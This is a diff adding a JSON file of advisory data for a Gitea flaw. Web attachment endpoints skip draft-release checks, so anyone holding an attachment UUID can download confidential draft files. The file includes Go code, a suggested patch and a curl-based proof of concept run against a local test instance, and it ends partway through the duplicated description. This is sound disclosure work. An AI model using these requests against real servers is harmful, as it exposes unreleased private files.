@@ -1,0 +1,2300 @@
+{
+  "gitea-draft-attachment@canonical": {
+    "ids": {
+      "CVE-2026-58432": {
+        "cve": {
+          "_error": "HTTP error",
+          "_http_status": 404
+        }
+      },
+      "GHSA-Q9PG-JJ6X-J9P6": {
+        "global": {
+          "credits": [
+            {
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/111015942?v=4",
+                "events_url": "https://api.github.com/users/z3r0s6/events{/privacy}",
+                "followers_url": "https://api.github.com/users/z3r0s6/followers",
+                "following_url": "https://api.github.com/users/z3r0s6/following{/other_user}",
+                "gists_url": "https://api.github.com/users/z3r0s6/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/z3r0s6",
+                "id": 111015942,
+                "login": "z3r0s6",
+                "node_id": "U_kgDOBp34Bg",
+                "organizations_url": "https://api.github.com/users/z3r0s6/orgs",
+                "received_events_url": "https://api.github.com/users/z3r0s6/received_events",
+                "repos_url": "https://api.github.com/users/z3r0s6/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/z3r0s6/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/z3r0s6/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/z3r0s6",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-58432",
+          "cvss": {
+            "score": 5.9,
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 5.9,
+              "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+            },
+            "cvss_v4": {
+              "score": 0.0,
+              "vector_string": null
+            }
+          },
+          "cwes": [
+            {
+              "cwe_id": "CWE-200",
+              "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+            },
+            {
+              "cwe_id": "CWE-639",
+              "name": "Authorization Bypass Through User-Controlled Key"
+            },
+            {
+              "cwe_id": "CWE-732",
+              "name": "Incorrect Permission Assignment for Critical Resource"
+            },
+            {
+              "cwe_id": "CWE-862",
+              "name": "Missing Authorization"
+            }
+          ],
+          "description": "### Summary\n\nGitea's draft-release access control is enforced only on the API release endpoints (`/api/v1/repos/{owner}/{repo}/releases/{id}` and its `/assets/...` sub-routes) but not on the web-level UUID-based attachment endpoints (`/attachments/{uuid}`, `/{owner}/{repo}/attachments/{uuid}`, `/{owner}/{repo}/releases/attachments/{uuid}`). Anyone (including unauthenticated callers) who has, learns, or otherwise obtains the UUID of an attachment belonging to a draft release can download its full contents, despite the draft release itself being correctly hidden from listings and direct-by-ID API lookups.\n\nThe `browser_download_url` field returned by the API (visible to anyone with write access to the repo) embeds the UUID. Forwarding this URL by email, log scrape, browser history, screenshot, or any side channel grants any recipient unauthenticated access to the attachment, indefinitely. This is the identical insider-leak threat model that Gitea fixed on the API surface in PR #36659 (CVE-2026-27660, Feb 2026) by adding `canAccessReleaseDraft` checks. The web mirror was missed.\n\n### Details\n\n**Root cause:** the web-side handler `ServeAttachment` (`routers/web/repo/attachment.go:122-203`) checks only repo-level unit-read permission, never the `IsDraft` flag of the linked release:\n\n```go\n// routers/web/repo/attachment.go:122-203, current implementation\nfunc ServeAttachment(ctx *context.Context, uuid string) {\n    attach, err := repo_model.GetAttachmentByUUID(ctx, uuid)\n    if err != nil { ... }\n\n    // cross-repo guard (only fires when accessed via repo-scoped URL)\n    if attach.CreatedUnix > repo_model.LegacyAttachmentMissingRepoIDCutoff &&\n       ctx.Repo.Repository != nil && ctx.Repo.Repository.ID != attach.RepoID {\n        ctx.HTTPError(http.StatusNotFound)\n        return\n    }\n\n    unitType, repoID, err := repo_service.GetAttachmentLinkedTypeAndRepoID(ctx, attach)\n    if unitType == unit.TypeInvalid {\n        if !(ctx.IsSigned && attach.UploaderID == ctx.Doer.ID) {\n            ctx.HTTPError(http.StatusNotFound)\n            return\n        }\n    } else {\n        var perm access_model.Permission\n        // ... resolves repo perm\n        if !perm.CanRead(unitType) {       // <-- ONLY check\n            ctx.HTTPError(http.StatusNotFound)\n            return\n        }\n        // NO release.IsDraft check\n        // NO canAccessReleaseDraft equivalent\n    }\n    // ... serves the file\n}\n```\n\nThe helper `GetAttachmentLinkedTypeAndRepoID` (`services/repository/repository.go:185-207`) returns `(unit.TypeReleases, rel.RepoID)` for release-linked attachments but discards the release object (including its `IsDraft` flag) before returning.\n\n**Mounted routes affected** (all reach `ServeAttachment` via `GetAttachment`):\n\n| File:line | Route | Auth gate |\n|---|---|---|\n| `routers/web/web.go:874` | `GET /attachments/{uuid}` (top-level) | `optionsCorsHandler() + webAuth.AllowBasic + webAuth.AllowOAuth2`, accepts anonymous |\n| `routers/web/web.go:1284` | `GET /{owner}/{repo}/attachments/{uuid}` (issue-context) | repo context, anonymous OK |\n| `routers/web/web.go:1473` | `GET /{owner}/{repo}/releases/attachments/{uuid}` (release-context) | `webAuth.AllowBasic + webAuth.AllowOAuth2`, anonymous OK |\n| `routers/web/web.go:1491` | `GET /{owner}/{repo}/attachments/{uuid}` (legacy compatibility) | `webAuth.AllowBasic + webAuth.AllowOAuth2`, anonymous OK |\n\n**Reference: existing fix on the API surface (PR #36659, commit `1eced4a7c0`, Feb 22 2026):**\n\n```go\n// routers/api/v1/repo/release.go:24-37, added by PR #36659\nfunc canAccessReleaseDraft(ctx *context.APIContext) bool {\n    if !ctx.IsSigned || !ctx.Repo.Permission.CanWrite(unit.TypeReleases) {\n        return false\n    }\n    // ... API-token scope check\n}\n```\n\n`canAccessReleaseDraft` is called from `GetRelease` (line 80), `ListReleases` (line 178), `GetReleaseAttachment` (`release_attachment.go:37`), and `ListReleaseAttachments` (line 148). Every API code path now gates draft visibility on **write access**. The web-side `ServeAttachment` was not updated; it continues to gate only on **read access**, allowing anonymous and non-collaborator reads.\n\n**Suggested patch** at `routers/web/repo/attachment.go:166-172`, extending the existing permission check to also gate draft releases on write access:\n\n```go\n} else { // linked attachment\n    var perm access_model.Permission\n    if ctx.Repo.Repository == nil {\n        repo, err := repo_model.GetRepositoryByID(ctx, repoID)\n        if err != nil { ... }\n        perm, err = access_model.GetDoerRepoPermission(ctx, repo, ctx.Doer)\n        if err != nil { ... }\n    } else {\n        perm = ctx.Repo.Permission\n    }\n\n    if !perm.CanRead(unitType) {\n        ctx.HTTPError(http.StatusNotFound)\n        return\n    }\n\n    // NEW: if linked to a draft release, require write access to releases\n    if unitType == unit.TypeReleases && attach.ReleaseID != 0 {\n        rel, err := repo_model.GetReleaseByID(ctx, attach.ReleaseID)\n        if err == nil && rel.IsDraft && !perm.CanWrite(unit.TypeReleases) {\n            ctx.HTTPError(http.StatusNotFound)\n            return\n        }\n    }\n}\n```\n\nAlternatively, `GetAttachmentLinkedTypeAndRepoID` could return the linked release object so the caller does not need a second DB read.\n\n### PoC\n\nTested against `v1.27.0+dev-228-ga564f0587a` (commit `a564f0587a`), default configuration, local-storage attachments.\n\n**Setup:**\n- `alice` owns public repo `alice/alice-pub`\n- `carol` is a registered user with no relationship to `alice` (no collaboration, no org membership)\n\n**Step 1: alice creates a confidential draft release and uploads a sensitive file:**\n\n```bash\n$ DRAFT=$(curl -s -H \"Authorization: token $ALICE_TOKEN\" -H 'Content-Type: application/json' \\\n    -d '{\"tag_name\":\"v1.0-CONFIDENTIAL\",\"target_commitish\":\"main\",\n         \"name\":\"INTERNAL PREVIEW\",\"body\":\"unreleased build\",\n         \"draft\":true,\"prerelease\":false}' \\\n    http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases)\n$ DID=$(echo \"$DRAFT\" | jq -r .id)         # e.g. 15\n\n$ echo \"TOP_SECRET_BUILD_ARTIFACT\" > confidential.txt\n$ ATT=$(curl -s -H \"Authorization: token $ALICE_TOKEN\" \\\n    -F \"attachment=@confidential.txt;filename=confidential.txt\" \\\n    http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases/$DID/assets)\n$ UUID=$(echo \"$ATT\" | jq -r .uuid)\n$ ATT_ID=$(echo \"$ATT\" | jq -r .id)\n# UUID: a4701819-6f12-42e4-82fb-14b2a1191e8a\n# browser_download_url returned: http://127.0.0.1:3000/attachments/<UUID>\n```\n\n**Step 2: non-collaborator carol cannot see the draft via the API (correct):**\n\n```bash\n$ curl -s -o /dev/null -w '%{http_code}\\n' \\\n    -H \"Authorization: token $CAROL_TOKEN\" \\\n    http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases/$DID/assets/$ATT_ID\n404\n```\n\n**Step 3: but carol (and even anonymous callers) CAN download via UUID-based web endpoints:**\n\n```bash\n# (C) carol, top-level\n$ curl -s -H \"Authorization: token $CAROL_TOKEN\" \\\n    http://127.0.0.1:3000/attachments/$UUID\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK, full content\n\n# (D) carol, repo-scoped legacy\n$ curl -s -H \"Authorization: token $CAROL_TOKEN\" \\\n    http://127.0.0.1:3000/alice/alice-pub/attachments/$UUID\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK\n\n# (E) carol, release-scoped web\n$ curl -s -H \"Authorization: token $CAROL_TOKEN\" \\\n    http://127.0.0.1:3000/alice/alice-pub/releases/attachments/$UUID\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK\n\n# (G) anonymous, top-level (NO auth header)\n$ curl -s http://127.0.0.1:3000/attachments/$UUID\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK, no auth needed at all\n\n# (H) anonymous, repo-scoped legacy\n$ curl -s http://127.0.0.1:3000/alice/alice-pub/attachments/$UUID\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK\n```\n\n**Verdict matrix:**\n\n| Endpoint | Carol (auth, non-collab) | Anonymous |\n|---|---|---|\n| API `/api/v1/.../releases/{id}/assets/{aid}` | 404 (gated) | 404 (gated) |\n| API `/api/v1/.../releases/{id}/assets` | 404 (gated) | 404 (gated) |\n| Web `/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |\n| Web `/{owner}/{repo}/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |\n| Web `/{owner}/{repo}/releases/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |\n| Web `browser_download_url` (as returned by API) | **200 LEAKS** | **200 LEAKS** |\n\n### Impact\n\n**Vulnerability class:** Missing authorization (CWE-862) on a parallel code path that was overlooked when the same authorization check was added in a separate handler. This is an **incomplete fix for CVE-2026-27660**.\n\n**Why this is an exploitable vulnerability, not a \"configure it differently\" issue:**\n\nThe Gitea draft-release feature exists for exactly one purpose: stage release content that is not yet meant to be public. The fix in PR #36659 (CVE-2026-27660) explicitly stated *\"Draft release and its attachments need a write permission to access\"* and accordingly gated `GET /api/v1/repos/.../releases/{id}` and `GET /api/v1/repos/.../releases/{id}/assets/{aid}` behind `canAccessReleaseDraft`. The web-side `ServeAttachment` handler (which is reachable from three separate routes on the same host as the API and serves the same underlying attachment object) was not updated. The result is that the security promise communicated to operators (\"draft attachments are visible only to repo writers\") is silently false on the web URLs that the API itself hands out in `browser_download_url`.\n\nThe maintainer cannot reframe this as \"UUID is a capability token\" because Gitea has already explicitly **rejected** that model on the API surface for this exact resource class two months ago. The threat model is identical; only the handler is different.\n\n**Real-world content that leaks under this bug:**\n\nDraft releases are routinely used to stage:\n\n- **Pre-release signed binaries** (Windows MSIs, macOS notarized DMGs, Linux RPM/DEB) before publication: unauthenticated download of unannounced builds.\n- **Security-fix release candidates**: pre-disclosure window for downstream patching, exploitable if the binary diff reveals the bug.\n- **Internal SBOMs, signing manifests, third-party license bundles**: supply-chain reconnaissance.\n- **Release-key public-blob bundles, attestation files**: key-rotation tracking by external observers.\n- **Build artifacts pinned to draft tags by CI pipelines that publish-on-merge**: access to artifacts the release engineer hasn't decided to ship.\n- **CHANGELOG / release-notes drafts**: pre-disclosure of upcoming features or vulns.\n\nThese are not hypothetical use cases. They are the documented and intended use of the draft-release feature on every git forge.\n\n**Realistic attack scenarios (insider-leak threat model, same as CVE-2026-27660):**\n\n1. **Browser-UI \"Copy link\" causes the URL to leave the trust boundary.** A release engineer is preparing the next release and copies the `browser_download_url` to test the binary on a fresh VM, then pastes it into a Slack thread, a Jira ticket, an email to QA, or a commit message (\"`# binary: $URL`\"). Anyone who later reads that channel (including ex-employees, contractors who lost write access, or anyone scraping public Slack archives) has anonymous, unauthenticated, indefinite access to the draft binary.\n\n2. **Reverse-proxy or observability stack records the URL.** nginx, Caddy, HAProxy, Cloudflare, Datadog, Splunk, ELK: any HTTP-instrumentation pipeline records request paths. Anyone with log read access can extract UUIDs and pull the underlying attachment without authenticating to Gitea at all. For ELT pipelines that copy logs to cloud buckets or data lakes, that read access can be very broad.\n\n3. **Browser history, Referer, extension telemetry.** Once an authorized user downloads a draft attachment, the UUID-bearing URL lives in browser history, optional cloud-synced history (Chrome Sync, Edge Sync, Firefox Sync, recoverable on any signed-in device), browser extension telemetry, and any `Referer` header sent if the URL is loaded in a frame or via an inline asset.\n\n4. **Search-engine and mirror indexing.** Internal portals, asset inventories, dependency scanners, and SaaS supply-chain tools that follow `browser_download_url` to index release artifacts will index the draft URL just like a published one. Once indexed, the URL is discoverable for as long as the index lives.\n\n5. **Embedded links in public content.** A draft-release-attachment URL pasted into an issue comment, a PR description, a wiki page, or a README is rendered as a clickable `<a href>` to any reader of that public page. Readers don't see the draft release itself but get the attachment behind the link they click.\n\n**Severity calibration via direct precedent:**\n\n| Property | CVE-2026-27660 (this finding's API mirror) | This finding |\n|---|---|---|\n| Vulnerability class | Missing authorization on draft release | Missing authorization on draft release attachments |\n| Attack vector | Network | Network |\n| Privileges required | None (relies on UUID/ID being leaked) | None (relies on UUID being leaked) |\n| Attack complexity | High (must obtain UUID/ID) | High (must obtain UUID) |\n| Confidentiality | High | High |\n| Integrity / Availability | None | None |\n| Fix complexity | ~5-line authz check added at handler entry | ~5-line authz check added at handler entry |\n| Severity assigned by upstream | Medium | **Should be Medium (5.9) by direct precedent** |\n\nIf CVE-2026-27660 was accepted as a Medium-severity security advisory worth a dedicated PR, an identical bug in the web mirror of the same data is also Medium-severity. The maintainer cannot consistently rate this lower without retroactively downgrading their own previous fix.\n\n**CVSS 3.1:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` = **5.9 / Medium**\n\n- `AV:N`: reachable over the network.\n- `AC:H`: attacker must obtain the UUID via a leak channel (same prerequisite class as the upstream CVE).\n- `PR:N`: no authentication required (anonymous works).\n- `UI:N`: no user interaction required.\n- `S:U`: scope unchanged (still bounded to Gitea's auth boundary; the draft release was supposed to be inside that boundary but isn't).\n- `C:H`: full confidentiality breach of the attachment contents.\n- `I:N` / `A:N`: read-only.\n\n**Out of scope:** brute-forcing the UUID is infeasible (122 bits of UUIDv4 entropy). This is a confidentiality-loss bug, not an integrity or availability bug.\n\n**Deployment scale:** Gitea is a top-three self-hosted forge (~30 k+ public Internet-reachable instances per Shodan, plus very large numbers of internal corporate deployments and Codeberg / Forgejo derivatives that inherit the same code). The bug is present in the default configuration; no operator action is required to make a deployment vulnerable.\n\n**Fix complexity:** trivial. Add a `release.IsDraft && !perm.CanWrite(unit.TypeReleases)` check in `ServeAttachment` (single function, ~5 lines added). Patch is provided in the Details section. No data migration, no UX change, no breaking-API change.",
+          "ghsa_id": "GHSA-q9pg-jj6x-j9p6",
+          "github_reviewed_at": "2026-07-21T20:19:25Z",
+          "html_url": "https://github.com/advisories/GHSA-q9pg-jj6x-j9p6",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-q9pg-jj6x-j9p6"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-58432"
+            }
+          ],
+          "nvd_published_at": null,
+          "published_at": "2026-07-21T20:19:25Z",
+          "references": [
+            "https://github.com/go-gitea/gitea/security/advisories/GHSA-q9pg-jj6x-j9p6",
+            "https://github.com/go-gitea/gitea/pull/38318",
+            "https://github.com/go-gitea/gitea/pull/38325",
+            "https://github.com/go-gitea/gitea/commit/ab10e37acf7fabf7829a485cc3e13d118638a856",
+            "https://github.com/go-gitea/gitea/commit/f7fd51022495737cf960b8c4053a27d69148f664",
+            "https://github.com/go-gitea/gitea/releases/tag/v1.27.0",
+            "https://github.com/advisories/GHSA-q9pg-jj6x-j9p6"
+          ],
+          "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-q9pg-jj6x-j9p6",
+          "severity": "medium",
+          "source_code_location": "https://github.com/go-gitea/gitea",
+          "summary": "Gitea: draft release attachment disclosure via missing web authorization",
+          "type": "reviewed",
+          "updated_at": "2026-07-21T20:19:26Z",
+          "url": "https://api.github.com/advisories/GHSA-q9pg-jj6x-j9p6",
+          "vulnerabilities": [
+            {
+              "first_patched_version": "1.27.0",
+              "package": {
+                "ecosystem": "go",
+                "name": "code.gitea.io/gitea"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "< 1.27.0"
+            }
+          ],
+          "withdrawn_at": null
+        },
+        "repo": {
+          "author": null,
+          "closed_at": null,
+          "collaborating_teams": null,
+          "collaborating_users": null,
+          "created_at": null,
+          "credits": [
+            {
+              "login": "z3r0s6",
+              "type": "reporter"
+            }
+          ],
+          "credits_detailed": [
+            {
+              "state": "accepted",
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/111015942?v=4",
+                "events_url": "https://api.github.com/users/z3r0s6/events{/privacy}",
+                "followers_url": "https://api.github.com/users/z3r0s6/followers",
+                "following_url": "https://api.github.com/users/z3r0s6/following{/other_user}",
+                "gists_url": "https://api.github.com/users/z3r0s6/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/z3r0s6",
+                "id": 111015942,
+                "login": "z3r0s6",
+                "node_id": "U_kgDOBp34Bg",
+                "organizations_url": "https://api.github.com/users/z3r0s6/orgs",
+                "received_events_url": "https://api.github.com/users/z3r0s6/received_events",
+                "repos_url": "https://api.github.com/users/z3r0s6/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/z3r0s6/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/z3r0s6/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/z3r0s6",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-58432",
+          "cvss": {
+            "score": 5.9,
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 5.9,
+              "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+            },
+            "cvss_v4": {
+              "score": null,
+              "vector_string": null
+            }
+          },
+          "cwe_ids": [
+            "CWE-200",
+            "CWE-639",
+            "CWE-732",
+            "CWE-862"
+          ],
+          "cwes": [
+            {
+              "cwe_id": "CWE-200",
+              "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+            },
+            {
+              "cwe_id": "CWE-639",
+              "name": "Authorization Bypass Through User-Controlled Key"
+            },
+            {
+              "cwe_id": "CWE-732",
+              "name": "Incorrect Permission Assignment for Critical Resource"
+            },
+            {
+              "cwe_id": "CWE-862",
+              "name": "Missing Authorization"
+            }
+          ],
+          "description": "### Summary\r\n\r\nGitea's draft-release access control is enforced only on the API release endpoints (`/api/v1/repos/{owner}/{repo}/releases/{id}` and its `/assets/...` sub-routes) but not on the web-level UUID-based attachment endpoints (`/attachments/{uuid}`, `/{owner}/{repo}/attachments/{uuid}`, `/{owner}/{repo}/releases/attachments/{uuid}`). Anyone (including unauthenticated callers) who has, learns, or otherwise obtains the UUID of an attachment belonging to a draft release can download its full contents, despite the draft release itself being correctly hidden from listings and direct-by-ID API lookups.\r\n\r\nThe `browser_download_url` field returned by the API (visible to anyone with write access to the repo) embeds the UUID. Forwarding this URL by email, log scrape, browser history, screenshot, or any side channel grants any recipient unauthenticated access to the attachment, indefinitely. This is the identical insider-leak threat model that Gitea fixed on the API surface in PR #36659 (CVE-2026-27660, Feb 2026) by adding `canAccessReleaseDraft` checks. The web mirror was missed.\r\n\r\n### Details\r\n\r\n**Root cause:** the web-side handler `ServeAttachment` (`routers/web/repo/attachment.go:122-203`) checks only repo-level unit-read permission, never the `IsDraft` flag of the linked release:\r\n\r\n```go\r\n// routers/web/repo/attachment.go:122-203, current implementation\r\nfunc ServeAttachment(ctx *context.Context, uuid string) {\r\n    attach, err := repo_model.GetAttachmentByUUID(ctx, uuid)\r\n    if err != nil { ... }\r\n\r\n    // cross-repo guard (only fires when accessed via repo-scoped URL)\r\n    if attach.CreatedUnix > repo_model.LegacyAttachmentMissingRepoIDCutoff &&\r\n       ctx.Repo.Repository != nil && ctx.Repo.Repository.ID != attach.RepoID {\r\n        ctx.HTTPError(http.StatusNotFound)\r\n        return\r\n    }\r\n\r\n    unitType, repoID, err := repo_service.GetAttachmentLinkedTypeAndRepoID(ctx, attach)\r\n    if unitType == unit.TypeInvalid {\r\n        if !(ctx.IsSigned && attach.UploaderID == ctx.Doer.ID) {\r\n            ctx.HTTPError(http.StatusNotFound)\r\n            return\r\n        }\r\n    } else {\r\n        var perm access_model.Permission\r\n        // ... resolves repo perm\r\n        if !perm.CanRead(unitType) {       // <-- ONLY check\r\n            ctx.HTTPError(http.StatusNotFound)\r\n            return\r\n        }\r\n        // NO release.IsDraft check\r\n        // NO canAccessReleaseDraft equivalent\r\n    }\r\n    // ... serves the file\r\n}\r\n```\r\n\r\nThe helper `GetAttachmentLinkedTypeAndRepoID` (`services/repository/repository.go:185-207`) returns `(unit.TypeReleases, rel.RepoID)` for release-linked attachments but discards the release object (including its `IsDraft` flag) before returning.\r\n\r\n**Mounted routes affected** (all reach `ServeAttachment` via `GetAttachment`):\r\n\r\n| File:line | Route | Auth gate |\r\n|---|---|---|\r\n| `routers/web/web.go:874` | `GET /attachments/{uuid}` (top-level) | `optionsCorsHandler() + webAuth.AllowBasic + webAuth.AllowOAuth2`, accepts anonymous |\r\n| `routers/web/web.go:1284` | `GET /{owner}/{repo}/attachments/{uuid}` (issue-context) | repo context, anonymous OK |\r\n| `routers/web/web.go:1473` | `GET /{owner}/{repo}/releases/attachments/{uuid}` (release-context) | `webAuth.AllowBasic + webAuth.AllowOAuth2`, anonymous OK |\r\n| `routers/web/web.go:1491` | `GET /{owner}/{repo}/attachments/{uuid}` (legacy compatibility) | `webAuth.AllowBasic + webAuth.AllowOAuth2`, anonymous OK |\r\n\r\n**Reference: existing fix on the API surface (PR #36659, commit `1eced4a7c0`, Feb 22 2026):**\r\n\r\n```go\r\n// routers/api/v1/repo/release.go:24-37, added by PR #36659\r\nfunc canAccessReleaseDraft(ctx *context.APIContext) bool {\r\n    if !ctx.IsSigned || !ctx.Repo.Permission.CanWrite(unit.TypeReleases) {\r\n        return false\r\n    }\r\n    // ... API-token scope check\r\n}\r\n```\r\n\r\n`canAccessReleaseDraft` is called from `GetRelease` (line 80), `ListReleases` (line 178), `GetReleaseAttachment` (`release_attachment.go:37`), and `ListReleaseAttachments` (line 148). Every API code path now gates draft visibility on **write access**. The web-side `ServeAttachment` was not updated; it continues to gate only on **read access**, allowing anonymous and non-collaborator reads.\r\n\r\n**Suggested patch** at `routers/web/repo/attachment.go:166-172`, extending the existing permission check to also gate draft releases on write access:\r\n\r\n```go\r\n} else { // linked attachment\r\n    var perm access_model.Permission\r\n    if ctx.Repo.Repository == nil {\r\n        repo, err := repo_model.GetRepositoryByID(ctx, repoID)\r\n        if err != nil { ... }\r\n        perm, err = access_model.GetDoerRepoPermission(ctx, repo, ctx.Doer)\r\n        if err != nil { ... }\r\n    } else {\r\n        perm = ctx.Repo.Permission\r\n    }\r\n\r\n    if !perm.CanRead(unitType) {\r\n        ctx.HTTPError(http.StatusNotFound)\r\n        return\r\n    }\r\n\r\n    // NEW: if linked to a draft release, require write access to releases\r\n    if unitType == unit.TypeReleases && attach.ReleaseID != 0 {\r\n        rel, err := repo_model.GetReleaseByID(ctx, attach.ReleaseID)\r\n        if err == nil && rel.IsDraft && !perm.CanWrite(unit.TypeReleases) {\r\n            ctx.HTTPError(http.StatusNotFound)\r\n            return\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nAlternatively, `GetAttachmentLinkedTypeAndRepoID` could return the linked release object so the caller does not need a second DB read.\r\n\r\n### PoC\r\n\r\nTested against `v1.27.0+dev-228-ga564f0587a` (commit `a564f0587a`), default configuration, local-storage attachments.\r\n\r\n**Setup:**\r\n- `alice` owns public repo `alice/alice-pub`\r\n- `carol` is a registered user with no relationship to `alice` (no collaboration, no org membership)\r\n\r\n**Step 1: alice creates a confidential draft release and uploads a sensitive file:**\r\n\r\n```bash\r\n$ DRAFT=$(curl -s -H \"Authorization: token $ALICE_TOKEN\" -H 'Content-Type: application/json' \\\r\n    -d '{\"tag_name\":\"v1.0-CONFIDENTIAL\",\"target_commitish\":\"main\",\r\n         \"name\":\"INTERNAL PREVIEW\",\"body\":\"unreleased build\",\r\n         \"draft\":true,\"prerelease\":false}' \\\r\n    http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases)\r\n$ DID=$(echo \"$DRAFT\" | jq -r .id)         # e.g. 15\r\n\r\n$ echo \"TOP_SECRET_BUILD_ARTIFACT\" > confidential.txt\r\n$ ATT=$(curl -s -H \"Authorization: token $ALICE_TOKEN\" \\\r\n    -F \"attachment=@confidential.txt;filename=confidential.txt\" \\\r\n    http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases/$DID/assets)\r\n$ UUID=$(echo \"$ATT\" | jq -r .uuid)\r\n$ ATT_ID=$(echo \"$ATT\" | jq -r .id)\r\n# UUID: a4701819-6f12-42e4-82fb-14b2a1191e8a\r\n# browser_download_url returned: http://127.0.0.1:3000/attachments/<UUID>\r\n```\r\n\r\n**Step 2: non-collaborator carol cannot see the draft via the API (correct):**\r\n\r\n```bash\r\n$ curl -s -o /dev/null -w '%{http_code}\\n' \\\r\n    -H \"Authorization: token $CAROL_TOKEN\" \\\r\n    http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases/$DID/assets/$ATT_ID\r\n404\r\n```\r\n\r\n**Step 3: but carol (and even anonymous callers) CAN download via UUID-based web endpoints:**\r\n\r\n```bash\r\n# (C) carol, top-level\r\n$ curl -s -H \"Authorization: token $CAROL_TOKEN\" \\\r\n    http://127.0.0.1:3000/attachments/$UUID\r\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK, full content\r\n\r\n# (D) carol, repo-scoped legacy\r\n$ curl -s -H \"Authorization: token $CAROL_TOKEN\" \\\r\n    http://127.0.0.1:3000/alice/alice-pub/attachments/$UUID\r\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK\r\n\r\n# (E) carol, release-scoped web\r\n$ curl -s -H \"Authorization: token $CAROL_TOKEN\" \\\r\n    http://127.0.0.1:3000/alice/alice-pub/releases/attachments/$UUID\r\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK\r\n\r\n# (G) anonymous, top-level (NO auth header)\r\n$ curl -s http://127.0.0.1:3000/attachments/$UUID\r\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK, no auth needed at all\r\n\r\n# (H) anonymous, repo-scoped legacy\r\n$ curl -s http://127.0.0.1:3000/alice/alice-pub/attachments/$UUID\r\nTOP_SECRET_BUILD_ARTIFACT          # <-- 200 OK\r\n```\r\n\r\n**Verdict matrix:**\r\n\r\n| Endpoint | Carol (auth, non-collab) | Anonymous |\r\n|---|---|---|\r\n| API `/api/v1/.../releases/{id}/assets/{aid}` | 404 (gated) | 404 (gated) |\r\n| API `/api/v1/.../releases/{id}/assets` | 404 (gated) | 404 (gated) |\r\n| Web `/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |\r\n| Web `/{owner}/{repo}/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |\r\n| Web `/{owner}/{repo}/releases/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |\r\n| Web `browser_download_url` (as returned by API) | **200 LEAKS** | **200 LEAKS** |\r\n\r\n### Impact\r\n\r\n**Vulnerability class:** Missing authorization (CWE-862) on a parallel code path that was overlooked when the same authorization check was added in a separate handler. This is an **incomplete fix for CVE-2026-27660**.\r\n\r\n**Why this is an exploitable vulnerability, not a \"configure it differently\" issue:**\r\n\r\nThe Gitea draft-release feature exists for exactly one purpose: stage release content that is not yet meant to be public. The fix in PR #36659 (CVE-2026-27660) explicitly stated *\"Draft release and its attachments need a write permission to access\"* and accordingly gated `GET /api/v1/repos/.../releases/{id}` and `GET /api/v1/repos/.../releases/{id}/assets/{aid}` behind `canAccessReleaseDraft`. The web-side `ServeAttachment` handler (which is reachable from three separate routes on the same host as the API and serves the same underlying attachment object) was not updated. The result is that the security promise communicated to operators (\"draft attachments are visible only to repo writers\") is silently false on the web URLs that the API itself hands out in `browser_download_url`.\r\n\r\nThe maintainer cannot reframe this as \"UUID is a capability token\" because Gitea has already explicitly **rejected** that model on the API surface for this exact resource class two months ago. The threat model is identical; only the handler is different.\r\n\r\n**Real-world content that leaks under this bug:**\r\n\r\nDraft releases are routinely used to stage:\r\n\r\n- **Pre-release signed binaries** (Windows MSIs, macOS notarized DMGs, Linux RPM/DEB) before publication: unauthenticated download of unannounced builds.\r\n- **Security-fix release candidates**: pre-disclosure window for downstream patching, exploitable if the binary diff reveals the bug.\r\n- **Internal SBOMs, signing manifests, third-party license bundles**: supply-chain reconnaissance.\r\n- **Release-key public-blob bundles, attestation files**: key-rotation tracking by external observers.\r\n- **Build artifacts pinned to draft tags by CI pipelines that publish-on-merge**: access to artifacts the release engineer hasn't decided to ship.\r\n- **CHANGELOG / 